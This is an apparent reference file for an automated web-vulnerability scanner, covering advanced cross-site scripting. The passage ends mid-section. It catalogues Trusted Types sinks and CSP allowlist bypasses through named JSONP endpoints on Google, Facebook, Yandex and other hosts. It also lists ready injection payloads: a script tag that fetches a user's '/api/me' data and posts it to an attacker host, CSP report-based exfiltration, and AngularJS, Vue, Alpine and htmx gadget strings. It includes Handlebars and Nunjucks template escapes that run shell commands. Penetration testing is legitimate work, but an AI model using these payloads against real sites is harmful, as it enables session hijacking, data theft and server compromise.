---
name: xss-advanced-deep
description: Advanced XSS depth — Trusted Types spec algorithms per gated sink, Google csp-evaluator allowlist-bypass DB applied per-CDN with each JSONP endpoint, script-gadget catalog per library with concrete gadgets, sanitizer-vs-browser parser-differential mechanism at HTML5 parsing algorithm depth, DOM clobbering advanced with type-coercion and PP-composite, framework compile-time-vs-runtime generalization, and WAF/filter bypass classes at every parser layer.
sibling: xss
load_when: scan_mode == "deep"
---

# XSS — Advanced Depth

This is the advanced+expert deep sibling to `xss.md`. The base owns the source/sink primitive model with CVE citations by number and pointer; the novel+frontier sibling `xss_novel_deep.md` owns the 2024–2026 published-instance frontier and hosts the canonical CVE version/fix tables. This file owns the operational depth in between — spec-algorithm and parser-differential mechanisms, per-CDN allowlist bypass, per-library script gadgets, and multi-axis WAF/filter bypass — routing by filename.

Load this file when the base file's confirmation-signal repertoire has not landed the finding: the target enforces Trusted Types and the finding requires understanding which specific sink is guarded; the CSP is strict-dynamic with a script-src allowlist that must be matched against Google's csp-evaluator DB per-endpoint; the sanitizer output looks safe but the browser re-parse yields an executing node and the parser-differential mechanism must be identified; the framework carries a compile-time-vs-runtime differential that grep alone did not surface; or a WAF blocks the payload class you know is available and the specific parser layer to attack must be picked.

## Trusted Types Spec Surface — Operational Depth

The base file names the three type classes and the primary bypass shapes. This section is the spec-algorithm depth — the per-sink enforcement, the pre-navigation algorithm, Default policy semantics, enforcement modes, and the interaction with existing CSP directives.

### The gated sink set — per-sink algorithm

The spec (W3C editor's draft at `w3c.github.io/trusted-types/dist/spec/`, WD dated 2026-06-23) gates an enumerated set of DOM sinks. Each sink has an enforcement algorithm — a specific Process-value-with-a-default-policy call that runs before the underlying operation. The full gated set, grouped by TrustedType class:

**TrustedHTML sinks** — enforce that any value written to these must be a TrustedHTML object (or pass through the default policy). Enforcement algorithm: `Process(value, expectedType=TrustedHTML, sink=<name>)`.

- `Element.innerHTML` setter and `Element.outerHTML` setter — the primary HTML fragment sinks.
- `Element.insertAdjacentHTML(position, string)` — with the string argument.
- `Document.write(...)`, `Document.writeln(...)` — take variadic string arguments; enforcement runs on the concatenated value.
- `execCommand('insertHTML', showUI, string)` — the third argument.
- `Range.createContextualFragment(fragment)` — the fragment string argument.
- `DOMParser.parseFromString(string, type)` — only when `type` is `text/html` or `application/xhtml+xml`; other types (`image/svg+xml`, `text/xml`) pass through without TT enforcement because their parsing does not produce a script-executing tree.
- `iframe.srcdoc` setter — the entire iframe document is TT-guarded; a `srcdoc="<script>...</script>"` requires TrustedHTML.
- `Element.setHTMLUnsafe(string)` and `ShadowRoot.setHTMLUnsafe(string)` — explicit unsafe setters that still require TrustedHTML under `require-trusted-types-for 'script'`.
- Historically: `Element.innerText` and `textContent` are *not* TT-gated because they don't parse HTML — but setting `HTMLScriptElement.innerText` is TT-gated because assigning to a script element's text is script-content.

**TrustedScript sinks** — enforce that any value that becomes executable code passes through TrustedScript.

- `HTMLScriptElement.text` setter, `HTMLScriptElement.innerText` setter, `HTMLScriptElement.textContent` setter — assigning to a script element's textual content.
- `HTMLScriptElement.innerHTML` and `outerHTML` — same as above, HTML fragment shape.
- `HTMLScriptElement.src` setter — this is a URL, but historically TT gates this too (with `TrustedScriptURL`, below).
- `SVGScriptElement.textContent` — SVG script content.
- Event-handler attribute string assignment — `element.setAttribute('onclick', 'alert(1)')` — the assigned string is a script-content sink because the attribute value becomes an event handler function body.
- `element.onclick = "string"` (assigning a string to an event handler property) — same class.
- `setTimeout(string, ...)`, `setInterval(string, ...)` — when the first argument is a string, it becomes an implicit `Function(string)` at execution; TT gates the string form.
- `setImmediate(string)` (non-standard, present in some environments).
- `eval(string)`, `Function(string)` — the direct code-eval sinks.
- Timer-with-string via `document.execScript(string)` (deprecated but still present in some IE-compat environments).

**TrustedScriptURL sinks** — enforce that any value that becomes a script URL passes through TrustedScriptURL.

- `HTMLScriptElement.src` — modern spec treats script src as TrustedScriptURL.
- `SVGScriptElement.href.baseVal`, `SVGScriptElement.href.animVal` — SVG script URL.
- `Worker(url)` constructor — the URL is the worker's source.
- `SharedWorker(url)` constructor — same.
- `ServiceWorkerContainer.register(url, options)` — the URL is the SW source.
- `Worker.importScripts(url, ...)` — variadic URL arguments, each TT-guarded.
- `import(url)` — dynamic import specifier.
- `HTMLIFrameElement.src` when the value is a `javascript:` URL — the base file's DOM XSS source catalog notes iframe.src as an assignment sink; TT enforcement adds the `javascript:` URL check.
- `HTMLObjectElement.data`, `HTMLEmbedElement.src` — object/embed script-executing loads.

**Navigation string sinks (pre-navigation check)** — special-case enforcement that runs before URL navigation. Not strictly a TrustedType-guarded sink, but the spec (§4.2.1.1) runs a Process-value-with-a-default-policy algorithm over `javascript:` URL requests before navigation completes.

- `Location.href` setter — assigning a string to `location.href` where the string is a `javascript:` URL.
- `Location.assign(url)`, `Location.replace(url)` — same enforcement.
- `HTMLAnchorElement.href` when the anchor is clicked with `javascript:` URL — the enforcement runs at navigation-attempt time, not at attribute-set time.
- `<form>` submission where `action="javascript:..."` — same.
- `window.open(url, ...)` when `url` is `javascript:` — pre-navigation check applies.

The enforcement returns `TrustedScript`-typed or "Blocked" — a Blocked return refuses the navigation and produces a violation report.

### Enforcement modes — enforce vs report-only

Two modes control TT enforcement:

- **`require-trusted-types-for 'script'` in `Content-Security-Policy`** — enforcement mode. Violations are blocked and reported.
- **`require-trusted-types-for 'script'` in `Content-Security-Policy-Report-Only`** — report-only mode. Violations are logged and reported but NOT blocked. From an exploitation perspective, report-only is equivalent to no-TT: the payload executes; the developer just gets a telemetry event.

Identify the mode from the header name; a target running report-only should be reported as such, and the finding is that the app has *marked* TT as intended but has not actually enforced it.

### Violation report shape — what the app sees

When TT enforcement fires (in either mode), the browser dispatches a `SecurityPolicyViolationEvent` on `document` and posts a report to any configured `report-uri` / `report-to` endpoint. The report body includes:

- `blocked-uri`: the identifier of the blocked sink (`trusted-types-sink`, or the specific sink name like `Element innerHTML`)
- `document-uri`: the page URL
- `original-policy`: the applied CSP directives
- `sample`: a 40-char prefix of the violating string (browsers truncate to avoid leaking secrets)

The `sample` field is what the assessor sees in browser DevTools when testing bypasses — read the sample to identify which sink fired and how much of the payload the browser retained.

### `trusted-types` directive semantics

- **`trusted-types <name1> <name2>`** — allowlists policy names. Only listed names can be created via `trustedTypes.createPolicy(<name>, ...)`; an attempt to create an unlisted-name policy throws `TypeError`. Missing the directive means any name is creatable, so the attacker can define their own `TrustedHTML`-shape values.
- **`trusted-types 'allow-duplicates'`** — allows the same policy name to be created multiple times without throwing. Useful for library-loaded-twice scenarios; less useful for security.
- **`trusted-types 'none'`** — disallows ALL policy creation. Combined with `require-trusted-types-for 'script'`, this means the application must have created its policies *before* this directive was parsed — usually via inline scripts or server-injected policy code. If the app has legitimate policies defined pre-CSP-parse, the `'none'` directive locks the policy set; if the app has no policies at all, every guarded sink refuses every string.

### Default policy — Process-value-with-a-default-policy

Trusted Types spec §2.3.4 defines the Default policy mechanism. When a plain string reaches a guarded sink, the browser runs the Process-value-with-a-default-policy algorithm:

1. Look up the currently-active default policy for the current realm.
2. If none exists, throw or Block (per enforcement mode).
3. If one exists, invoke the corresponding method (`createHTML`, `createScript`, `createScriptURL`) on the default policy with the string.
4. The method's return value replaces the string. If the method returns `null` or throws, Block.
5. Otherwise the return value passes through as the trusted type.

The Default policy is registered with `trustedTypes.createPolicy('default', {createHTML: fn, createScript: fn, createScriptURL: fn})`. This is the concrete surface for default-policy-escape bypass classes — see `xss_novel_deep.md § Trusted Types Default-Policy-Escape Frontier`.

### Sinks NOT covered — the residual exploitation surface

The spec explicitly enumerates four Non-Goals. Every one of them is a live exploitation vector even under strict TT enforcement:

1. **Server-side reflections into script bodies** — a `<script>alert('<%= user %>')</script>` server-render reflects into script contents; the bytes reach the browser as JavaScript before the DOM even sees them. TT operates on runtime DOM assignments, not server-render output.
2. **Cross-origin JavaScript execution via `data:` URLs** — a `data:text/html,<script>alert(1)</script>` URL loaded in an iframe executes in the iframe's own origin (per browser origin rules), not the parent's. TT on the parent doesn't intercept.
3. **Resource confinement / data exfiltration prevention** — if an XSS has fired via any Non-Goal vector, TT doesn't prevent the script from making network requests, reading DOM state, or invoking `fetch` for exfiltration.
4. **Protection against a malicious author of the app's own JavaScript** — the app's own JS is trusted; a malicious library imported into the bundle isn't blocked from creating a default policy that returns unsafe HTML.

Frontier bypasses live in the Non-Goals surface. CSS-injection-reaching-unguarded-sink is TT-compatible (CSS is not TT-gated). URL sinks that aren't `Location.href` (form action, anchor href on user click) may not have pre-navigation check applied consistently. DOM clobbering that reaches a downstream sink is a bypass because clobbering happens via HTML attributes (`id`/`name`), not a TT-gated sink.

### Worker / ServiceWorker enforcement

TT enforcement propagates into worker contexts:

- **Worker (dedicated)** — the worker's global scope receives the parent's TT configuration; `Worker.importScripts(url)` requires TrustedScriptURL just like `import(url)` in the main thread.
- **ServiceWorker** — the SW's install-time `importScripts` calls require TrustedScriptURL. A ServiceWorker registered with a `TrustedScriptURL` for the SW source URL passes; a plain-string registration fails under enforcement.
- **Shared Worker** — same class as dedicated worker for `importScripts`.

TT does not propagate into `postMessage` payloads — a message sent to a worker containing an HTML string is not TT-transformed. If the worker then uses the string in an HTML sink (unusual but possible with `OffscreenCanvas` or worker-side DOM libraries), the sink is subject to worker-context TT.

### Interaction with existing CSP directives

- **`script-src` allowlist / nonces / hashes** — remains in effect. TT gates the DOM assignment; CSP gates the network fetch. A `<script src="TrustedScriptURL(...)">` still requires the URL to match `script-src`.
- **`unsafe-inline`** — TT-enforced pages should not use `unsafe-inline`; the two are conceptually at odds. If both are present, `unsafe-inline` allows inline scripts (bypassing TT for those inlines) but TT still guards runtime assignments.
- **`unsafe-eval`** — `eval(TrustedScript)` and `Function(TrustedScript)` are the TT-gated equivalents; without `unsafe-eval` in CSP, even the TT-guarded form fails.
- **`strict-dynamic`** — trusts scripts created by trusted scripts; TT enforces that the created script's src is a TrustedScriptURL. The two compose.

## CSP Allowlist Bypass DB — Applied Per CDN

The base file names Google's csp-evaluator JSONP bypass DB with the 6 `needsEval` domains and the 134+ URLs list. This section is the per-CDN operational depth — each allowlisted origin, its specific JSONP endpoints, callback shape, request format, expected payload structure, and the fingerprint that confirms the endpoint is reachable from the target.

### The enumeration workflow

For each target:

1. **Fetch the target's CSP per route** — `curl -sI 'https://target/route' | grep -i content-security-policy`. The policy varies per route in most apps — the API path, static path, error path, and main-app path often differ. Enumerate every route the target exposes.
2. **Extract the `script-src` allowlist and companion directives** — parse the directive; keep host origins (`*.example.com`, `example.com`), nonces, hashes, and companion `object-src`, `base-uri`, `default-src`. A `default-src 'self'` with no `script-src` means script-src falls back to `default-src`, which is `'self'` only — no CDN allowlist.
3. **Match host origins against Google's csp-evaluator DB** — for each host, look up whether it appears in `allowlist_bypasses/json/jsonp.json` under `urls` (bypass without `unsafe-eval`) or `needsEval` (bypass requires `unsafe-eval` alongside).
4. **Pick a specific bypass endpoint that reaches from the browser** — the DB entry lists the protocol-relative URL that hosts the JSONP callback. Fetch it from the browser via `<script src="//<host>/<path>?callback=alert(1)"></script>`; confirm via alert-box or `document.title` mutation, then replace with actual exploit payload.

### Google — the widest bypass surface

Google's own script-hosting fleet is on nearly every high-traffic web app's CSP allowlist. Confirmed JSONP-reachable endpoints:

**`ajax.googleapis.com`** — the Google Ajax API host. Full JSONP surface across many Google APIs:
- `//ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert&q=x` — Google Feed API JSONP with `callback` parameter.
- `//ajax.googleapis.com/ajax/services/feed/load?v=1.0&callback=alert&q=x` — Feed load endpoint.
- `//ajax.googleapis.com/ajax/services/search/web?v=1.0&callback=alert&q=x` — Search API (legacy) JSONP.
- Historical: `//ajax.googleapis.com/ajax/libs/angularjs/1.2.0/angular.min.js` — loads AngularJS (script gadget under strict-dynamic).

Any target with `script-src 'self' *.googleapis.com` or `script-src ajax.googleapis.com` is bypassable by injecting `<script src="//ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=alert(1)"></script>`.

**`www.googleadservices.com`** — appears in the DB with `callback=` parameter reachable on ad-tracking JSONP endpoints.

**`google-analytics.com` / `ssl.google-analytics.com` / `www.google-analytics.com`** — appear in the `needsEval` list. Analytics uses `unsafe-eval` for its own runtime, and the JSONP bypass requires the calling CSP to also permit `unsafe-eval`. Endpoints of interest include the `gtag/js` and `analytics.js` loaders that themselves fetch and eval.

**`www.googletagmanager.com`** / **`googletagmanager.com`** — Google Tag Manager. On the `needsEval` list. GTM is itself a script-injector and reaches script-execution as a strict-dynamic gadget: adding GTM to an allowlist under `strict-dynamic` implicitly trusts every script GTM loads. GTM's `gtm.js` endpoint accepts a container ID; a container the attacker controls loads attacker-specified scripts.

**`googleusercontent.com`** — historically hosted the `gadgets/proxy` endpoint (`//googleusercontent.com/gadgets/proxy?url=...`) that proxied arbitrary URL contents. A target allowlisting `*.googleusercontent.com` inherits the proxy's bypass surface.

**`maps.googleapis.com`** — has multiple callback-shape endpoints including `//maps.googleapis.com/maps/api/js/GeoPhotoService.GetMetadata?...&callback=alert(1)` (Google Street View metadata JSONP; verified in the csp-evaluator DB).

**`doubleclick.net`** — Google's ad-serving domain; hosts several callback-shape endpoints on ad-tracking paths.

**`www.googleadservices.com` / `googleadservices.com`** — ad-services JSONP endpoints on the `urls` list.

The Google-family combined attack: allowlist match on `*.googleapis.com` → pick `ajax.googleapis.com/ajax/services/feed/find` → inject `<script src="//ajax.googleapis.com/ajax/services/feed/find?v=1.0&callback=fetch('/api/me',{credentials:'include'}).then(r=>r.text()).then(t=>fetch('//attacker/x',{method:'POST',body:t}))"></script>`. The `callback` parameter passes through the endpoint's response JSONP wrapping and executes with same origin as the target.

### Facebook — restserver.php surface

Facebook's `api.facebook.com`, `graph.facebook.com`, `www.facebook.com` all host `restserver.php`, a legacy REST endpoint that accepts a `callback` parameter and returns JSONP:

- `//api.facebook.com/restserver.php?method=user.getInfo&callback=alert(1)` — the primary Facebook JSONP endpoint. The `method` parameter names a Facebook Graph method; the `callback` wraps the response.
- `//www.facebook.com/restserver.php?method=user.getInfo&callback=alert(1)` — the `www.facebook.com`-hosted variant.
- `//graph.facebook.com/1/<node>?callback=alert(1)` — Graph API v1 JSONP; `<node>` is any graph object ID.
- `//graph.facebook.com/<user>?callback=alert(1)` — Graph API JSONP for user profile.

Any target with `script-src *.facebook.com` inherits these. The class fingerprint: `curl -s 'https://www.facebook.com/restserver.php?method=user.getInfo&callback=X'` returns text starting with `X({...})`. If yes, the endpoint is live; inject `<script src="//www.facebook.com/restserver.php?method=user.getInfo&callback=YOUR_PAYLOAD"></script>` with `YOUR_PAYLOAD` being a syntactically-valid JavaScript identifier that also has side effects (`fetch('/api/me').then(...)` wrapped as an IIFE or arrow function).

### Twitter/X — publish.twitter.com/oembed and syndication endpoints

Twitter/X hosts JSONP-shape oembed endpoints:

- `//publish.twitter.com/oembed?url=<url>&callback=alert(1)` — oembed with URL and callback parameters. Returns JSONP with the embed HTML wrapped in the callback.
- `//syndication.twitter.com/i/jot?a=?<callback>` — syndication endpoint (historical shape).
- `//cdn.syndication.twitter.com/timeline/profile?screen_name=<name>&callback=alert(1)` — timeline endpoint.

Target-side: `script-src *.twitter.com` or `script-src publish.twitter.com` is bypassable.

### Vimeo — oembed.json

- `//vimeo.com/api/oembed.json?url=<video_url>&callback=alert(1)` — Vimeo's oembed JSONP endpoint.

`script-src *.vimeo.com` allowlists this bypass.

### Yandex — mc, share, translate

Yandex's ad and translation infrastructure hosts multiple JSONP endpoints:

- `//mc.yandex.ru/watch/<counter>?callback=alert(1)` — Yandex.Metrica counter JSONP.
- `//share.yandex.net/?service=twitter&callback=alert(1)` — Yandex share widget JSONP.
- `//translate.yandex.net/api/v1.5/tr.json/detect?text=x&callback=alert(1)` — translate API JSONP.

`script-src *.yandex.ru` or `.yandex.net` — bypassable.

### Yahoo — YQL and Pipes

Legacy Yahoo API infrastructure:

- `//query.yahooapis.com/v1/public/yql?q=<query>&format=json&callback=alert(1)` — YQL JSONP.
- `//pipes.yahooapis.com/pipes/pipe.run?_id=<pipe_id>&_render=json&_callback=alert(1)` — Yahoo Pipes JSONP.

`script-src *.yahooapis.com` — bypassable.

### Mixpanel — track endpoint

- `//api.mixpanel.com/track/?data=<b64>&callback=alert(1)` — Mixpanel event-tracking JSONP.

### Flickr — feeds

- `//api.flickr.com/services/feeds/photos_friends.gne?id=<user_id>&format=json&jsoncallback=alert(1)` — Flickr photo feed JSONP.
- `//api.flickr.com/services/feeds/photos_public.gne?tags=<tag>&format=json&jsoncallback=alert(1)` — public photo feed.

Note the callback parameter is `jsoncallback` on Flickr, not `callback`.

### Instagram — media feeds

- `//api.instagram.com/v1/tags/<tag>/media/recent?callback=alert(1)` — Instagram tag-media JSONP (legacy API; may require API key).

### The needsEval bypass shape

The 6 `needsEval` origins (googletagmanager.com, www.googletagmanager.com, www.googleadservices.com, google-analytics.com, ssl.google-analytics.com, www.google-analytics.com) are bypasses that require `unsafe-eval` alongside the allowlisted origin. Mechanism: the endpoint's returned JSONP payload uses `eval` internally to decode a base64 or JSONP-wrapped inner payload. Without `unsafe-eval` in the target CSP, the `eval` call fails; with `unsafe-eval`, the outer JSONP fetches and the inner eval decodes to attacker-supplied code.

Fingerprint: a CSP with `script-src *.google-analytics.com 'unsafe-eval'` matches both conditions. The `checkScriptAllowlistBypass` function in `checks/security_checks.ts` of csp-evaluator handles this — `needsEval` entries are discarded if the policy lacks `unsafe-eval`, otherwise they count as bypasses.

### Fingerprinting an allowlisted CDN

Once the target's CSP is enumerated, verify each allowlisted origin's JSONP endpoint is actually reachable from the target's origin:

1. From an arbitrary browser tab open to `about:blank` or a test page:
   ```javascript
   const s = document.createElement('script');
   s.src = '//<allowlisted-host>/<path>?callback=window.__probe';
   window.__probe = () => console.log('reachable');
   document.head.appendChild(s);
   ```
2. If the endpoint returns wrapped JSONP, the browser executes the wrapping and calls `window.__probe`. If it returns 404 or non-script content, no script executes.
3. Some CDNs geofence or rate-limit; test from the same geographic region as the target's user base if possible.

### The strict-dynamic gadget class

`'strict-dynamic'` in CSP trusts any script created by an already-trusted script. If the target's `script-src` includes a known-gadget library (AngularJS, jQuery, GTM), the strict-dynamic trust propagates from the nonced-loader-of-the-gadget to whatever the gadget produces. Enumerate:

- What scripts does the target load? (`document.querySelectorAll('script')` in the target's DevTools.)
- Are any of them known-gadget libraries?
- If yes, is there a data-attribute or HTML injection path that the gadget converts to script execution?

The strict-dynamic-with-gadget class collapses even a nonce-based CSP because the browser's trust propagates from the nonced loader to the gadget's output.

### CSP injection

If the app reflects a user-controlled value into the CSP header or a `<meta http-equiv="Content-Security-Policy">` tag, the attacker rewrites the policy. Add `unsafe-inline` or a host you control. The reflection surface:

- Response-header injection via `Set-Cookie` or `Location`-shape headers that get concatenated into the response.
- Meta tag injection via user-controlled DOM.

Load `header_injection` for the response-splitting path that reaches the header.

### CSP report-uri exfiltration

`report-uri` receives violation reports including the blocked URI, blocked resource, and (in some browser versions) the sample of the violating content. Craft violations whose blocked URI encodes secret data:

- Read a secret from the DOM (`document.querySelector('input[name=csrf]').value`).
- Trigger a violation whose blocked URI encodes the secret: `<img src="//<secret-value>/x">` — the blocked URI in the report is `<secret-value>/x`.
- The `report-uri` endpoint receives the report; the URL contains the exfil.

The exfil channel works even when script is blocked, because CSP violations are dispatched by the browser itself.

## Script Gadget Classes Across Libraries — Concrete Gadgets

The base file names framework compilers, data-attribute gadgets, JSONP, and jQuery as gadget classes. This section is the per-library operational depth: the specific markup / attribute / expression that converts non-script HTML injection to script execution, with concrete payload shapes.

### AngularJS 1.x — the expression-sandbox-escape catalog

AngularJS is the archetypal script-gadget library. `<div ng-app>` in the injected HTML boots AngularJS on the injected subtree, and `{{ ... }}` expressions inside compile to JavaScript. Prior to 1.6, the expression sandbox limited what expressions could reach; 1.6+ removed the sandbox because the security team concluded sandbox escapes were inevitable.

**Core gadgets** (all require AngularJS loaded on the page):

- `<div ng-app>{{constructor.constructor('alert(1)')()}}</div>` — `constructor.constructor` on `{{}}`-scope expression reaches Function.
- `<div ng-app>{{$eval.constructor('alert(1)')()}}</div>` — `$eval` is the scope's expression evaluator; its constructor is Function.
- `<div ng-app>{{$parse.constructor('alert(1)')()}}</div>` — `$parse` service constructor.
- `<div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1) + \'alert(1)\')(');}}</div>` — historical pre-1.6 sandbox-escape via prototype mutation.
- `<div ng-app>{{[].pop.constructor('alert(1)')()}}</div>` — array-method constructor gadget.

**Directive-based gadgets**:

- `<img ng-src="javascript:alert(1)">` — `ng-src` bypasses browser XSS auditor because Angular sets `src` at runtime.
- `<a ng-href="javascript:alert(1)">click</a>` — `ng-href` variant.
- `<div ng-include="'attacker-controlled-url'"></div>` — `ng-include` fetches a URL and injects it as a template; the fetched content is subject to AngularJS compilation, so a fetched `{{ constructor... }}` fires.
- `<div ng-init="constructor.constructor('alert(1)')()"></div>` — `ng-init` evaluates its expression at boot.
- `<script type="text/ng-template" id="foo">{{constructor...}}</script><div ng-include="'foo'"></div>` — inline template via type="text/ng-template" isn't blocked by CSP script-src.

**Route-based gadgets**:

- `<div ng-view></div>` — with a manipulated URL fragment, ng-view loads a route template. If routes are user-configurable, injecting `<ng-view>` reaches template compilation.

Any sanitizer that allows `ng-*`, `data-ng-*`, or `x-ng-*` attribute prefixes admits these gadgets. DOMPurify's default configuration strips `ng-*`; check `ADD_ATTR` or a custom hook in the target's DOMPurify config.

### Vue 2 — in-DOM template compilation gadgets

Vue 2's full build (`vue.js`, not `vue.runtime.js`) includes the compiler; if Vue mounts to an existing DOM element, the element's contents are compiled as a template. User-injected content into the mounted subtree becomes template code.

- `<div id="app">{{_c.constructor('alert(1)')()}}</div>` — `_c` is the create-element helper; its constructor reaches Function.
- `<div id="app">{{[].constructor.constructor('alert(1)')()}}</div>` — array constructor gadget, same shape as AngularJS.
- `<div id="app" v-bind:href="'javascript:alert(1)'">click</div>` — v-bind with a static string.
- `<div id="app" v-html="'<img src=x onerror=alert(1)>'"></div>` — v-html renders unescaped HTML.
- `<div id="app"><component :is="'script'"></component></div>` — dynamic `:is` binding to a tag name.

Vue 2 runtime-only builds don't include the compiler; safe from the CSTI gadget class but still vulnerable to `v-html` if that markup passes.

### Vue 3 — full-build compiler gadgets

Vue 3's default is runtime-only. The full build (`vue.global.js`) includes the compiler. Where present:

- `<div id="app">{{ constructor.constructor('alert(1)')() }}</div>` — same shape.
- `<div id="app" v-html="user"></div>` — v-html sink, active in both builds.
- Vue 3 SSR: SSR-generated HTML that hydrates on the client — if the SSR output includes user input that got escaped once at SSR-time, the client's hydration doesn't re-escape but may re-parse; a mutation-XSS class emerges.

### AlpineJS — full x-* directive gadget catalog

AlpineJS is a lightweight reactive framework; every `x-*` directive is an expression eval site.

- `<div x-data="{msg: 'user'}"></div>` — `x-data` evaluates a JS expression. If `user` reaches this attribute value, `x-data="{}; alert(1); //"` fires.
- `<div x-init="alert(1)"></div>` — `x-init` runs its expression on element init.
- `<div x-show="user"></div>` — `x-show` is a boolean-expression eval; user-controlled expression fires.
- `<div x-if="user"></div>` — same class as x-show but conditional rendering.
- `<div x-for="i in <user>"></div>` — x-for iterates over an expression; user-supplied expression fires.
- `<div x-text="user"></div>` — x-text sets textContent from expression; if the expression is `constructor.constructor('alert(1)')()`, it fires.
- `<div x-html="'<img src=x onerror=alert(1)>'"></div>` — x-html renders raw HTML.
- `<div x-on:click="alert(1)"></div>` / `<div @click="alert(1)"></div>` — event handler with attribute-value expression.
- `<div x-bind:src="'javascript:alert(1)'"></div>` — dynamic binding.
- `<div x-model="user"></div>` — two-way binding on user-expression.

Alpine v3 introduced CSP-safe mode (`alpine-csp`) that disables `x-html` and expression-eval; targets running v3 non-CSP-mode inherit the full gadget class.

### htmx — hx-* attribute gadget catalog

htmx is a modern JavaScript library for HTML-driven AJAX; several attributes carry script-execution potential:

- `<a hx-get="/api/x" hx-target="#result" hx-swap="innerHTML"></a>` — `hx-swap="innerHTML"` sinks the response as raw HTML. If the response contains attacker-controlled content, XSS.
- `<a hx-get="/api/x" hx-swap="outerHTML"></a>` — similar sink shape.
- `<a hx-vals='javascript:{a:alert(1)}'></a>` — htmx docs specify that `hx-vals` prefixed with `javascript:` is evaluated as JavaScript. Direct code eval.
- `<a hx-headers='javascript:{"X-Header":alert(1)}'></a>` — same as hx-vals for headers.
- `<a hx-on="click:alert(1)"></a>` — `hx-on:<event>` binds inline event handlers; evaluated as JavaScript.
- `<a hx-boost="true"></a>` — hijacks link/form submission; combined with a target that returns attacker-influenced HTML, converts navigation to XSS.
- `<a hx-trigger="load javascript:alert(1)"></a>` — trigger with JS eval.

htmx's own security-posture essay (`htmx.org/essays/web-security-basics-with-htmx/`) acknowledges the class; the mitigation is `hx-vals` restricted to JSON form only, blocking the `javascript:` prefix. Check the target's htmx version and configuration.

### jQuery — HTML sinks and eval sinks

jQuery is present in a majority of legacy targets. Its HTML-parsing sinks execute inline scripts:

- `$(userHtml)` where `userHtml` starts with `<` — jQuery parses HTML and runs any `<script>` tags inline.
- `$.parseHTML(userHtml, ctx, true)` — the third argument (`keepScripts`) defaults to true in older jQuery. Explicit passing runs scripts.
- `$.globalEval(str)` — literal `eval` on the string.
- `.html(userHtml)`, `.append(userHtml)`, `.prepend(userHtml)`, `.before(userHtml)`, `.after(userHtml)`, `.replaceWith(userHtml)` — all sink through jQuery's HTML parser.
- `$.get(url)` / `$.getJSON(url, cb)` where the response includes script — the response is executed as JS if content-type indicates JSON with padding.
- `$('#el').attr('href', 'javascript:alert(1)')` — jQuery's attr setter allows javascript: URLs without validation.

jQuery gadgets are especially reachable because sanitizers routinely allow `<div>`, `<span>`, `<a>` — the tag markup that jQuery selectors match — while stripping only `<script>`. A DOMPurify-sanitized `<a>` with a `data-jquery-thing` attribute that jQuery reads reaches script.

### Polymer / Knockout / Aurelia / Ractive — data-binding gadgets

Data-binding libraries expose script gadgets via specific attribute names:

- **Knockout**: `<div data-bind="html: userInput"></div>` — `data-bind` with `html:` binding sinks unescaped HTML.
- **Knockout**: `<div data-bind="event: {click: userExpression}"></div>` — event binding with expression eval.
- **Polymer**: `<div bind="[[userExpression]]"></div>` — Polymer's binding attribute.
- **Aurelia**: `<div innerhtml.bind="user"></div>` — Aurelia's innerhtml binding.
- **Ractive**: `<div ractive-html="user"></div>` — Ractive's HTML directive.

Sanitizers that don't strip `data-*` attributes admit these gadgets when the library is loaded.

### Google Closure Library — legacy gadgets

Google Closure has documented gadget classes:

- `goog.dom.setInnerHtml(el, str)` — internal sink; if a wrapper reaches user input, XSS.
- `goog.string.htmlEscape(user)` is safe; `goog.html.uncheckedconversions.safeHtmlFromString(user)` is not (it's the escape hatch).
- Closure Templates: `{$user |noAutoescape}` disables autoescaping.

### Lodash `_.template`

Lodash's template engine compiles ERB-style templates to JavaScript at runtime:

- `_.template("<%= user %>")` — compiles user-controlled markup to `${escape(user)}`; unescaped variant `<%- user %>` produces raw markup.
- `_.template("<% user %>")` — statement form; user-controlled expression runs as JavaScript.
- The compiled function includes an inline `Function` call — if the target's CSP has `unsafe-eval`, this works; if not, Lodash template throws.

### Handlebars — helper and pre-4.0 sandbox escapes

Handlebars 4.0+ restricted its expression compiler; earlier versions had documented sandbox escapes via `this.constructor.constructor`:

- `{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}` — the infamous published Handlebars pre-4.0 sandbox-escape shape.
- Custom helpers: any `Handlebars.registerHelper('helper', fn)` that concatenates its argument into an HTML template output; if `fn` returns a `SafeString`, the output isn't escaped.

### EJS — the `<%- %>` unescape

EJS supports three delimiter shapes:

- `<%= user %>` — HTML-escaped.
- `<%- user %>` — raw (unescaped).
- `<% user %>` — statement (evaluate as JavaScript).

The `<%- %>` shape in a server-render is direct XSS if `user` contains HTML; the `<% %>` shape is server-side code eval.

### Nunjucks — Jinja2-shape gadgets in JS

Nunjucks is Mozilla's Jinja2-inspired engine for JavaScript. Same class as Jinja2:

- `{{ range.constructor("return process")().mainModule.require("child_process").execSync("id") }}` — reaches Node's `child_process` via constructor-chain. Load `ssti` for the general engine catalog.

### The gadget-discovery pattern for a target

For each script-src allowlisted origin and each loaded script:
1. Identify the framework/library and its version.
2. Look up the version's known-gadget class list (this section + primary sources).
3. Verify whether the target's sanitizer allows the marker attribute (`ng-*`, `x-*`, `data-bind`, `hx-*`, `data-ractive-*`).
4. If any marker passes, the gadget class is live regardless of CSP or sanitizer strictness on the primary XSS payload.

## Sanitizer-vs-Browser Parser-Differential Class Mechanism

The base file names DOMPurify's mXSS class and cites the 2024–2026 CVE cluster; the novel deep decomposes each CVE mechanism-by-mechanism. This section is the class-mechanism depth at the HTML5 parsing algorithm layer — where sanitizers and browsers can disagree.

### The core mechanism

A sanitizer parses HTML into a tree, applies its rules, and serializes the result back to a string. The browser then parses that string. If the parse-serialize-reparse cycle is not idempotent (which it isn't for HTML), the browser's DOM differs from what the sanitizer approved. Any node in the browser's DOM that wasn't in the sanitizer's approved tree is a bypass candidate; any execution-capable node (script element, event handler, javascript: URL) is a live bypass.

### The HTML5 parsing algorithm surface

The HTML5 spec defines the parser as a tokenizer (state machine over the input bytes producing tokens) plus a tree-construction algorithm (state machine over tokens producing the DOM tree). Parser divergences arise at both layers.

**Tokenizer states of exploitation interest**:

- **Data state** — the default. Reads characters as text unless `<` (which starts a tag), `&` (which starts a character reference), or null.
